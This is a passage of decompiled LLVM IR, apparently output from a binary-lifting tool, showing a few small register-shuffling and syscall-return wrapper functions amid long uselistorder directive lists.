  uselistorder i32 8, { 71, 72, 73, 74, 75, 76, 77, 64, 65, 66, 67, 138, 78, 219, 34, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 79, 80, 81, 82, 83, 84, 85, 28, 86, 87, 88, 89, 90, 91, 92, 93, 94, 68, 69, 70, 109, 110, 111, 46, 237, 238, 29, 170, 171, 172, 173, 174, 175, 176, 177, 7, 56, 178, 179, 180, 181, 182, 183, 184, 185, 8, 157, 158, 159, 160, 161, 162, 163, 164, 186, 187, 188, 189, 190, 9, 191, 192, 10, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 210, 203, 204, 205, 206, 57, 23, 207, 208, 209, 58, 59, 11, 211, 212, 213, 214, 216, 217, 60, 12, 218, 13, 215, 37, 38, 35, 36, 25, 26, 31, 32, 39, 239, 112, 113, 114, 115, 47, 62, 30, 14, 15, 22, 16, 40, 99, 41, 17, 18, 19, 100, 48, 95, 49, 96, 50, 97, 51, 98, 63, 33, 101, 102, 103, 24, 27, 105, 20, 52, 106, 53, 107, 108, 104, 116, 117, 118, 3, 119, 120, 121, 4, 122, 123, 124, 125, 126, 127, 128, 5, 129, 130, 131, 132, 133, 134, 135, 6, 139, 42, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 165, 43, 166, 44, 167, 45, 168, 54, 169, 0, 1, 61, 21, 136, 55, 137, 2 }
  uselistorder i32 9, { 5, 25, 20, 21, 55, 57, 6, 39, 4, 40, 9, 28, 10, 29, 11, 30, 26, 7, 8, 27, 22, 31, 2, 23, 24, 32, 12, 33, 13, 34, 14, 35, 15, 36, 37, 16, 38, 0, 17, 1, 53, 41, 42, 43, 44, 45, 46, 18, 47, 48, 49, 50, 51, 52, 54, 3, 56, 19 }
  uselistorder i32 16, { 108, 109, 110, 102, 103, 104, 105, 111, 33, 34, 35, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 112, 113, 114, 115, 116, 2, 1, 25, 48, 49, 50, 51, 119, 52, 120, 117, 118, 53, 54, 121, 9, 55, 56, 122, 123, 57, 58, 124, 125, 106, 107, 59, 143, 144, 98, 99, 100, 101, 60, 26, 136, 36, 61, 62, 63, 225, 226, 227, 228, 64, 229, 3, 65, 230, 231, 0, 232, 233, 66, 24, 145, 67, 146, 68, 69, 10, 23, 11, 12, 4, 13, 14, 70, 128, 71, 37, 72, 126, 129, 127, 132, 133, 38, 97, 134, 73, 74, 15, 92, 16, 17, 75, 130, 131, 39, 135, 40, 76, 77, 137, 78, 138, 79, 139, 80, 140, 81, 141, 82, 142, 41, 218, 147, 148, 27, 149, 150, 18, 151, 152, 5, 83, 153, 154, 155, 28, 156, 157, 158, 159, 160, 6, 84, 161, 29, 162, 163, 164, 19, 165, 166, 93, 20, 94, 167, 85, 86, 168, 169, 7, 43, 170, 42, 171, 30, 172, 173, 174, 21, 175, 176, 95, 22, 96, 177, 87, 88, 178, 179, 8, 45, 180, 44, 181, 89, 183, 184, 185, 186, 31, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 201, 200, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 215, 214, 216, 217, 219, 220, 32, 221, 222, 223, 224, 90, 46, 234, 91, 47, 182 }
  uselistorder i32* @r1, { 15, 14, 58, 16, 17, 18, 19, 1, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 2, 95, 96, 20, 21, 22, 23, 0, 44, 45, 11, 24, 37, 38, 39, 3, 73, 71, 72, 4, 74, 5, 29, 30, 10, 59, 60, 61, 7, 25, 46, 12, 75, 76, 47, 8, 77, 48, 49, 31, 26, 27, 28, 33, 32, 62, 34, 35, 36, 40, 41, 42, 43, 50, 51, 52, 9, 53, 68, 69, 6, 54, 55, 56, 57, 63, 64, 65, 66, 67, 70, 13 }
  uselistorder label %dec_label_pc_15ea8, { 1, 0 }
  uselistorder label %dec_label_pc_15e98, { 1, 0 }
  uselistorder label %dec_label_pc_15e50, { 1, 0 }
  uselistorder label %dec_label_pc_15e44, { 1, 0 }
}

define i32 @function_15eb4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15eb4:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_15eb4 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_15ec4 = call i32 @function_11110()
  %v0_15ec8 = load i32, i32* @r5, align 4
  %v1_15ec8 = load i32, i32* @r4, align 4
  %v2_15ec8 = add i32 %v1_15ec8, %v0_15ec8
  store i32 %v6_15eb4, i32* @r5, align 4
  ret i32 %v2_15ec8

; uselistorder directives
  uselistorder i32 ()* @function_11110, { 6, 7, 3, 0, 2, 1, 5, 4 }
  uselistorder i32* @r5, { 41, 42, 43, 44, 27, 28, 29, 30, 31, 32, 33, 34, 35, 45, 5, 46, 47, 48, 643, 644, 645, 49, 23, 50, 0, 51, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 19, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 25, 26, 74, 75, 76, 77, 78, 79, 6, 80, 81, 82, 83, 84, 85, 86, 7, 87, 88, 89, 10, 90, 91, 8, 92, 93, 94, 95, 96, 97, 9, 98, 99, 100, 101, 102, 103, 36, 11, 37, 38, 39, 40, 226, 227, 228, 229, 230, 231, 658, 12, 659, 660, 668, 104, 105, 106, 107, 108, 109, 110, 661, 662, 663, 664, 665, 666, 667, 111, 112, 113, 114, 597, 598, 602, 603, 604, 605, 606, 599, 600, 601, 546, 547, 548, 13, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 607, 608, 631, 14, 632, 633, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 3, 622, 623, 624, 625, 626, 15, 627, 628, 629, 630, 125, 126, 127, 128, 129, 232, 233, 16, 234, 235, 236, 237, 238, 24, 115, 239, 17, 240, 241, 242, 243, 244, 245, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 121, 122, 124, 123, 116, 117, 118, 119, 120, 174, 175, 176, 177, 178, 179, 180, 181, 182, 188, 189, 190, 191, 192, 193, 183, 184, 185, 186, 187, 401, 402, 403, 404, 405, 406, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 1, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 2, 225, 246, 247, 248, 249, 250, 20, 251, 252, 253, 254, 255, 256, 257, 21, 258, 22, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 407, 408, 18, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 4, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 634, 635, 636, 637, 638, 639, 640, 641, 642, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400 }
  uselistorder i32* @r2, { 7, 10, 11, 39, 40, 12, 13, 14, 15, 16, 17, 28, 8, 9, 29, 41, 46, 47, 48, 49, 1, 52, 42, 22, 23, 43, 2, 3, 36, 37, 4, 38, 5, 0, 50, 6, 51, 44, 45, 24, 25, 26, 30, 31, 35, 21, 18, 19, 20, 27, 32, 33, 34 }
}

define i32 @function_15ed8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15ed8:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15f18, label %dec_label_pc_15f04

dec_label_pc_15f04:                               ; preds = %dec_label_pc_15ed8
  %v0_15f04 = call i32 @function_11008()
  %v0_15f08 = load i32, i32* %r4.global-to-local, align 4
  %v1_15f08 = sub i32 0, %v0_15f08
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_15f10 = inttoptr i32 %v0_15f04 to i32*
  store i32 %v1_15f08, i32* %v2_15f10, align 4
  %v0_15f20.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15f20

dec_label_pc_15f18:                               ; preds = %dec_label_pc_15ed8
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_15f18 = icmp eq i32 %arg1, 0
  br i1 %v2_15f18, label %dec_label_pc_15f2c, label %dec_label_pc_15f20

dec_label_pc_15f20:                               ; preds = %dec_label_pc_15f18, %dec_label_pc_15f04
  %v0_15f20 = phi i32 [ %arg1, %dec_label_pc_15f18 ], [ %v0_15f20.pre, %dec_label_pc_15f04 ]
  br label %dec_label_pc_15f30

dec_label_pc_15f2c:                               ; preds = %dec_label_pc_15f18
  br label %dec_label_pc_15f30

dec_label_pc_15f30:                               ; preds = %dec_label_pc_15f20, %dec_label_pc_15f2c
  %v1_15f38 = phi i32 [ %v0_15f20, %dec_label_pc_15f20 ], [ %tmp8, %dec_label_pc_15f2c ]
  ret i32 %v1_15f38

; uselistorder directives
  uselistorder i32 -1, { 251, 257, 169, 252, 253, 254, 118, 255, 119, 256, 90, 91, 92, 93, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 170, 171, 0, 172, 156, 258, 259, 173, 120, 260, 174, 1, 94, 261, 262, 160, 263, 175, 3, 2, 176, 177, 121, 326, 122, 123, 295, 124, 300, 111, 301, 286, 287, 288, 125, 250, 126, 302, 303, 4, 178, 179, 180, 304, 282, 283, 161, 181, 5, 182, 6, 183, 162, 305, 10, 184, 185, 9, 11, 306, 8, 186, 187, 95, 7, 188, 96, 97, 98, 99, 189, 190, 191, 107, 266, 267, 12, 268, 127, 307, 128, 129, 298, 130, 308, 131, 292, 132, 269, 133, 284, 134, 135, 270, 136, 309, 137, 310, 110, 168, 13, 290, 192, 138, 299, 139, 328, 140, 271, 141, 272, 142, 273, 143, 289, 144, 330, 145, 293, 146, 327, 147, 296, 148, 291, 149, 274, 150, 151, 152, 329, 153, 285, 193, 194, 195, 14, 105, 108, 15, 16, 109, 106, 158, 159, 196, 19, 197, 20, 198, 275, 100, 21, 199, 200, 201, 202, 18, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 264, 154, 265, 22, 228, 229, 113, 112, 276, 17, 230, 231, 232, 23, 233, 116, 117, 114, 115, 234, 24, 235, 155, 277, 101, 25, 26, 163, 278, 164, 279, 28, 165, 280, 27, 29, 30, 31, 166, 281, 32, 33, 34, 35, 236, 36, 102, 37, 38, 237, 39, 157, 40, 41, 42, 238, 43, 44, 45, 46, 47, 48, 49, 50, 51, 103, 52, 53, 54, 55, 56, 239, 57, 240, 58, 59, 60, 241, 61, 62, 63, 242, 64, 65, 66, 67, 68, 243, 69, 70, 71, 72, 73, 74, 244, 75, 167, 297, 76, 77, 78, 245, 79, 80, 81, 246, 82, 83, 84, 247, 85, 86, 87, 88, 248, 249, 294, 89, 104 }
  uselistorder i32 ()* @function_11008, { 62, 58, 61, 60, 59, 64, 32, 31, 5, 4, 21, 29, 16, 19, 18, 63, 15, 14, 13, 41, 40, 20, 10, 12, 11, 55, 54, 9, 26, 25, 8, 23, 53, 39, 52, 51, 7, 6, 57, 56, 17, 36, 35, 34, 24, 2, 50, 49, 48, 37, 0, 22, 3, 27, 33, 47, 28, 46, 1, 38, 45, 44, 43, 42, 30 }
  uselistorder i32 1, { 204, 203, 820, 638, 392, 393, 394, 639, 352, 821, 822, 823, 640, 67, 69, 68, 70, 65, 71, 66, 72, 641, 36, 35, 37, 642, 29, 30, 27, 33, 31, 28, 32, 643, 224, 163, 162, 448, 476, 449, 1031, 1032, 1033, 1034, 461, 644, 378, 646, 645, 376, 377, 824, 647, 452, 1131, 453, 825, 1132, 826, 827, 828, 830, 829, 438, 648, 832, 831, 956, 957, 1133, 454, 1134, 1135, 1136, 1137, 1138, 1139, 816, 1140, 1141, 1142, 1143, 1144, 1145, 817, 632, 650, 649, 367, 368, 373, 375, 374, 369, 366, 370, 372, 371, 836, 833, 834, 835, 474, 455, 166, 164, 165, 168, 167, 517, 837, 838, 839, 840, 651, 633, 125, 126, 841, 654, 653, 652, 99, 103, 101, 104, 105, 100, 102, 518, 842, 656, 655, 398, 396, 399, 395, 397, 400, 843, 657, 356, 355, 354, 844, 845, 658, 229, 228, 659, 317, 519, 819, 312, 313, 846, 847, 848, 849, 520, 850, 851, 852, 456, 662, 661, 660, 420, 419, 423, 422, 421, 424, 853, 854, 855, 664, 663, 187, 188, 521, 856, 665, 214, 857, 858, 859, 860, 861, 522, 666, 143, 145, 146, 144, 147, 523, 7, 362, 667, 159, 158, 363, 668, 189, 669, 150, 149, 670, 9, 14, 8, 13, 17, 16, 12, 15, 10, 11, 671, 86, 85, 83, 82, 84, 80, 81, 672, 331, 332, 339, 340, 336, 337, 335, 338, 333, 334, 673, 219, 220, 380, 958, 358, 361, 359, 360, 674, 62, 61, 675, 93, 676, 246, 247, 1146, 524, 1147, 525, 677, 43, 39, 44, 42, 40, 45, 46, 41, 148, 526, 298, 297, 678, 381, 382, 160, 441, 862, 863, 864, 679, 1029, 682, 681, 680, 230, 683, 450, 931, 451, 932, 933, 442, 934, 430, 431, 429, 432, 433, 436, 435, 434, 935, 1148, 462, 527, 685, 684, 686, 47, 1088, 1091, 1092, 1093, 687, 384, 389, 390, 388, 387, 391, 385, 386, 1094, 1095, 1096, 1097, 688, 405, 411, 404, 410, 409, 403, 413, 412, 407, 401, 406, 402, 408, 1089, 1090, 528, 50, 49, 48, 51, 1081, 529, 1082, 1083, 1084, 1085, 1086, 689, 95, 96, 94, 97, 115, 114, 1098, 1099, 1100, 1101, 1102, 1103, 481, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 531, 1112, 1113, 1114, 1115, 1116, 530, 1117, 1118, 1119, 1120, 1121, 690, 271, 278, 269, 276, 275, 280, 273, 279, 274, 272, 277, 270, 365, 364, 532, 533, 896, 446, 694, 693, 692, 691, 55, 98, 457, 314, 695, 90, 89, 186, 696, 351, 697, 91, 698, 353, 699, 248, 700, 157, 156, 321, 701, 300, 299, 702, 323, 703, 64, 63, 704, 1035, 1036, 87, 88, 865, 866, 867, 868, 869, 870, 871, 1149, 116, 117, 118, 119, 705, 959, 534, 120, 121, 872, 706, 79, 535, 707, 56, 482, 536, 708, 265, 263, 264, 709, 124, 123, 122, 710, 53, 52, 711, 153, 712, 341, 713, 223, 222, 714, 202, 201, 316, 315, 715, 74, 73, 716, 155, 154, 717, 92, 718, 152, 151, 719, 200, 199, 221, 720, 379, 281, 721, 722, 322, 723, 267, 266, 437, 1122, 383, 960, 961, 962, 963, 440, 964, 725, 724, 113, 111, 110, 108, 109, 106, 107, 112, 0, 936, 937, 938, 939, 1037, 458, 1038, 459, 1039, 727, 726, 427, 426, 428, 965, 966, 967, 728, 60, 59, 57, 58, 1123, 1124, 463, 1, 439, 516, 1125, 19, 18, 20, 21, 891, 892, 893, 537, 968, 425, 1065, 970, 969, 971, 141, 142, 1040, 729, 1056, 730, 218, 217, 216, 215, 1041, 731, 78, 77, 76, 75, 549, 897, 550, 898, 483, 899, 551, 894, 900, 539, 901, 465, 552, 553, 876, 873, 541, 447, 874, 875, 542, 877, 878, 879, 543, 880, 881, 546, 882, 883, 544, 884, 885, 545, 540, 886, 887, 888, 547, 889, 890, 548, 895, 902, 903, 904, 554, 905, 906, 907, 555, 464, 908, 818, 911, 910, 538, 909, 912, 913, 556, 914, 915, 916, 466, 923, 924, 443, 557, 634, 743, 742, 741, 740, 739, 738, 737, 736, 735, 734, 733, 732, 205, 210, 209, 208, 212, 213, 206, 211, 207, 917, 918, 558, 919, 920, 559, 921, 922, 346, 345, 344, 350, 347, 348, 349, 343, 342, 560, 561, 745, 744, 416, 417, 414, 415, 418, 1126, 472, 460, 746, 139, 138, 137, 136, 140, 134, 132, 131, 133, 135, 1042, 748, 747, 237, 238, 236, 235, 234, 239, 54, 485, 925, 564, 926, 484, 927, 562, 563, 565, 928, 929, 566, 567, 568, 569, 570, 571, 572, 760, 759, 758, 757, 756, 755, 754, 753, 752, 637, 751, 750, 749, 127, 128, 130, 129, 573, 444, 574, 761, 575, 576, 577, 580, 579, 578, 930, 763, 762, 232, 231, 233, 581, 940, 473, 941, 942, 582, 475, 583, 943, 584, 944, 585, 945, 586, 946, 587, 947, 588, 948, 589, 949, 590, 950, 591, 951, 592, 952, 593, 953, 594, 954, 595, 955, 445, 596, 777, 776, 775, 774, 773, 772, 771, 770, 769, 768, 767, 766, 765, 764, 240, 241, 242, 245, 243, 244, 972, 978, 3, 467, 973, 597, 974, 2, 975, 477, 976, 468, 469, 977, 979, 980, 478, 981, 635, 781, 780, 636, 779, 778, 161, 1071, 486, 487, 1072, 4, 5, 6, 982, 983, 984, 598, 985, 599, 600, 986, 488, 987, 782, 179, 183, 184, 185, 182, 178, 181, 180, 988, 989, 990, 601, 991, 602, 490, 489, 603, 992, 604, 993, 783, 172, 175, 176, 177, 174, 169, 173, 170, 171, 994, 995, 996, 997, 998, 605, 999, 606, 1000, 607, 495, 494, 608, 1001, 491, 1002, 492, 1003, 493, 1004, 789, 788, 787, 786, 785, 784, 327, 328, 329, 330, 324, 326, 325, 1005, 1006, 1007, 1008, 1009, 609, 1010, 610, 1011, 611, 504, 503, 612, 1012, 502, 1013, 501, 1014, 496, 1015, 497, 1016, 498, 1017, 499, 1018, 500, 1019, 795, 794, 793, 792, 791, 790, 293, 294, 296, 295, 290, 292, 291, 1043, 1044, 1045, 1046, 1047, 479, 480, 613, 1048, 1049, 614, 1050, 1051, 615, 1052, 1054, 1053, 799, 798, 797, 796, 303, 305, 307, 308, 306, 301, 304, 302, 1057, 1058, 1059, 616, 617, 801, 800, 258, 261, 262, 257, 260, 259, 1060, 1061, 1062, 618, 507, 506, 619, 1063, 505, 1064, 802, 282, 283, 287, 288, 289, 286, 285, 284, 1066, 1067, 1068, 620, 510, 509, 621, 1069, 508, 1070, 807, 806, 805, 804, 803, 190, 191, 196, 197, 198, 195, 194, 193, 192, 1073, 1074, 1075, 622, 1076, 623, 512, 511, 624, 1077, 808, 251, 253, 254, 255, 256, 249, 252, 250, 1078, 1079, 625, 1080, 513, 470, 626, 809, 318, 319, 320, 1127, 1128, 627, 1129, 514, 471, 628, 810, 310, 309, 311, 1087, 515, 629, 811, 227, 225, 226, 1130, 812, 357, 1020, 268, 1021, 1024, 630, 1025, 1026, 1022, 1023, 1027, 1028, 22, 23, 25, 24, 26, 1030, 631, 813, 1055, 34, 814, 815, 38 }
  uselistorder i32 %arg1, { 1, 3, 4, 0, 2 }
  uselistorder label %dec_label_pc_15f30, { 1, 0 }
}

define i32 @function_15f3c() local_unnamed_addr {
entry:
  %v3_15f40 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_15f40)
  %v31_15f48 = load i32, i32* @r0, align 4
  ret i32 %v31_15f48

; uselistorder directives
  uselistorder i32* @r0, { 31, 16, 25, 61, 60, 148, 19, 4, 5, 176, 6, 12, 7, 62, 0, 63, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 1, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 64, 27, 58, 59, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 26, 29, 117, 118, 13, 30, 10, 203, 205, 206, 50, 51, 52, 53, 54, 55, 56, 57, 11, 20, 76, 77, 204, 102, 103, 78, 163, 24, 48, 49, 164, 2, 165, 166, 167, 162, 159, 46, 160, 161, 47, 18, 173, 168, 169, 170, 171, 172, 84, 85, 23, 86, 9, 21, 119, 120, 121, 147, 14, 15, 22, 174, 122, 175, 28, 123, 124, 125, 126, 81, 82, 87, 33, 79, 80, 83, 88, 91, 92, 93, 94, 89, 90, 34, 35, 36, 37, 95, 96, 38, 39, 97, 98, 99, 100, 101, 104, 105, 40, 41, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 42, 116, 43, 127, 128, 129, 130, 131, 132, 133, 8, 134, 135, 136, 137, 138, 139, 140, 156, 157, 3, 141, 142, 143, 144, 149, 150, 151, 152, 153, 154, 155, 158, 145, 146, 44, 45, 17, 32 }
  uselistorder void (i32)* @__pseudo_branch, { 0, 59, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 1, 2, 3, 64, 65, 66, 67, 60, 48, 61, 62, 63, 68, 69, 70, 49, 50, 51, 45, 46, 47, 52, 56, 57, 53, 54, 55, 71, 38, 39, 40, 41, 42, 43, 44, 58 }
  uselistorder i32 0, { 563, 564, 573, 574, 575, 576, 577, 103, 578, 579, 580, 0, 581, 296, 66, 582, 366, 583, 584, 585, 327, 328, 565, 566, 571, 1, 104, 105, 937, 938, 939, 940, 139, 140, 941, 586, 141, 106, 1131, 1132, 1133, 297, 587, 588, 589, 298, 1134, 67, 299, 1135, 1136, 84, 41, 42, 590, 75, 2, 98, 99, 786, 76, 77, 78, 787, 788, 1137, 1138, 1139, 1140, 1141, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1142, 1143, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 32, 1162, 1163, 1164, 1165, 1166, 33, 1167, 1168, 1169, 34, 1170, 1171, 1172, 35, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1197, 1198, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 36, 1216, 1217, 1218, 1219, 1220, 37, 1221, 1222, 1223, 1224, 1225, 38, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 142, 591, 541, 592, 593, 594, 595, 596, 367, 368, 597, 598, 107, 108, 109, 599, 600, 604, 601, 602, 603, 300, 313, 605, 606, 110, 143, 609, 607, 608, 301, 610, 111, 611, 612, 3, 4, 112, 613, 557, 558, 369, 559, 614, 615, 616, 68, 69, 617, 618, 619, 144, 620, 621, 622, 623, 624, 370, 625, 626, 627, 628, 629, 630, 113, 631, 632, 633, 634, 5, 6, 145, 147, 635, 146, 636, 148, 637, 114, 638, 643, 644, 639, 640, 641, 646, 647, 648, 149, 649, 650, 651, 652, 653, 642, 645, 654, 115, 567, 568, 569, 1241, 1242, 1044, 931, 1052, 572, 789, 790, 329, 791, 371, 560, 372, 561, 1053, 1054, 1055, 150, 1056, 792, 793, 794, 562, 570, 116, 151, 1243, 1244, 1057, 1058, 117, 152, 373, 1248, 1249, 374, 1250, 1251, 153, 303, 1252, 1253, 375, 70, 1254, 1255, 376, 1262, 1265, 532, 302, 1266, 377, 1263, 1264, 1245, 1246, 542, 154, 289, 655, 657, 656, 155, 658, 659, 660, 378, 661, 100, 932, 91, 933, 157, 156, 934, 1247, 752, 753, 754, 755, 756, 757, 159, 118, 758, 759, 760, 92, 158, 761, 119, 380, 381, 1257, 379, 120, 540, 121, 160, 1064, 1065, 1066, 1067, 1068, 161, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 162, 1059, 382, 1060, 1061, 383, 1062, 1063, 122, 1045, 384, 163, 1046, 1047, 1048, 1049, 1050, 123, 171, 168, 164, 165, 167, 170, 166, 173, 172, 169, 1076, 1077, 1101, 1102, 124, 1078, 1079, 177, 175, 176, 1080, 1081, 183, 182, 135, 174, 1082, 1083, 1084, 1085, 1086, 1087, 320, 319, 330, 385, 1088, 1089, 1090, 71, 1091, 179, 178, 180, 181, 134, 1092, 1093, 304, 1094, 1095, 101, 1096, 1097, 1098, 1099, 1100, 7, 8, 684, 685, 72, 125, 9, 331, 386, 1103, 1022, 1023, 1104, 900, 686, 762, 687, 688, 1105, 1106, 942, 1267, 1268, 79, 126, 795, 796, 797, 184, 662, 663, 185, 798, 803, 804, 805, 806, 186, 332, 187, 321, 322, 387, 799, 188, 800, 801, 127, 807, 1024, 1258, 689, 690, 691, 802, 1261, 901, 1256, 943, 808, 692, 935, 693, 388, 1259, 95, 1260, 763, 10, 1107, 1108, 96, 1109, 1110, 1111, 1112, 1113, 189, 1114, 533, 543, 534, 535, 1115, 544, 136, 190, 809, 810, 811, 93, 315, 812, 813, 545, 11, 305, 191, 192, 193, 43, 194, 389, 694, 814, 815, 816, 1117, 1116, 1118, 1119, 1120, 1121, 39, 195, 1122, 1123, 1124, 196, 85, 86, 364, 365, 676, 198, 197, 199, 817, 200, 818, 819, 201, 1003, 1004, 390, 202, 820, 203, 204, 975, 205, 944, 206, 207, 702, 695, 208, 696, 697, 698, 677, 678, 680, 664, 665, 546, 666, 679, 667, 547, 668, 548, 669, 549, 670, 550, 671, 672, 87, 44, 292, 293, 673, 551, 674, 552, 675, 681, 682, 391, 683, 699, 531, 700, 392, 701, 307, 306, 703, 704, 705, 706, 210, 209, 707, 708, 709, 553, 290, 710, 80, 81, 291, 711, 82, 83, 393, 713, 714, 536, 715, 716, 717, 718, 719, 394, 720, 721, 722, 316, 137, 539, 723, 724, 725, 726, 727, 728, 538, 729, 730, 395, 731, 396, 732, 735, 736, 737, 211, 733, 212, 734, 13, 12, 213, 712, 945, 946, 537, 530, 738, 214, 739, 740, 741, 742, 743, 744, 745, 295, 294, 397, 746, 398, 747, 399, 748, 323, 749, 324, 400, 750, 446, 447, 401, 751, 402, 764, 765, 766, 219, 218, 554, 128, 555, 217, 216, 215, 309, 317, 403, 767, 220, 221, 775, 768, 769, 770, 771, 772, 773, 774, 308, 404, 776, 405, 777, 406, 778, 407, 779, 408, 780, 781, 409, 782, 783, 784, 45, 785, 222, 410, 94, 821, 822, 823, 824, 312, 825, 826, 827, 311, 828, 829, 830, 831, 223, 832, 834, 833, 129, 130, 224, 310, 226, 225, 835, 227, 228, 73, 229, 836, 232, 837, 838, 839, 840, 231, 230, 233, 841, 842, 46, 47, 131, 843, 844, 14, 15, 16, 17, 845, 846, 234, 334, 847, 411, 848, 412, 849, 413, 850, 414, 851, 415, 852, 416, 853, 333, 854, 238, 856, 857, 858, 859, 236, 235, 239, 860, 861, 48, 49, 855, 237, 863, 862, 18, 19, 20, 21, 864, 240, 865, 866, 336, 867, 417, 868, 418, 869, 419, 870, 420, 871, 421, 872, 422, 873, 335, 874, 423, 875, 244, 877, 878, 879, 880, 242, 241, 245, 881, 882, 50, 51, 876, 243, 883, 52, 424, 884, 886, 887, 888, 889, 425, 890, 22, 23, 24, 25, 26, 885, 246, 891, 892, 342, 893, 341, 894, 340, 895, 339, 896, 337, 897, 338, 898, 426, 899, 250, 903, 904, 905, 906, 248, 247, 251, 907, 908, 53, 54, 902, 249, 909, 55, 427, 910, 912, 913, 914, 915, 428, 916, 27, 28, 29, 30, 31, 911, 252, 917, 918, 344, 919, 343, 920, 429, 921, 255, 947, 948, 949, 950, 254, 253, 256, 951, 952, 56, 57, 138, 97, 257, 74, 431, 953, 954, 955, 956, 957, 258, 958, 959, 347, 960, 961, 962, 963, 262, 259, 260, 261, 964, 965, 966, 967, 432, 968, 969, 346, 971, 430, 972, 345, 973, 433, 974, 264, 976, 977, 978, 979, 263, 265, 980, 981, 58, 59, 88, 982, 266, 983, 984, 350, 348, 985, 349, 986, 989, 990, 991, 268, 269, 992, 993, 60, 987, 988, 267, 995, 994, 996, 270, 997, 998, 353, 999, 352, 1000, 351, 1001, 434, 1002, 1006, 1007, 1008, 272, 273, 274, 1010, 1011, 61, 1009, 